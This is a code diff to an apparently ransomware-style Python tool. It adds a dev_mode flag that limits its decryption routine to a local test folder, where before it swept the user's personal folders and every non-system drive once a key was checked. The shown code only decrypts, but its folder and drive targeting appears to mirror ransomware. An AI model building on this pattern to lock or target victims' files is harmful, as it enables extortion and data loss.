@@ -69,19 +69,24 @@ def start_decryption():
         print(f"\n{Fore.LIGHTRED_EX}Invalid key")
         input("Press enter to exit...")
         sys.exit(2)
-    decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key)
-    decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), key)
-    decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), key)
-    decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), key)
-    decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), key)
-    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
-    for disk in [
-        f"{letter}:/"
-        for i, letter in enumerate(string.ascii_uppercase)
-        if bitmask & (1 << i)
-    ]:
-        if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
-            decrypt_directory(disk, key)
+    if not dev_mode:
+        decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key)
+        decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), key)
+        decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), key)
+        decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), key)
+        decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), key)
+        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+        for disk in [
+            f"{letter}:/"
+            for i, letter in enumerate(string.ascii_uppercase)
+            if bitmask & (1 << i)
+        ]:
+            if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
+                decrypt_directory(disk, key)
+    else:
+        decrypt_directory(
+            ".\\test", key
+        )
 
 
 def decrypt_directory(directory_path, key):
@@ -113,6 +118,6 @@ def main():
         except:
             pass
 
-
+dev_mode = True
 if __name__ == "__main__":
     main()
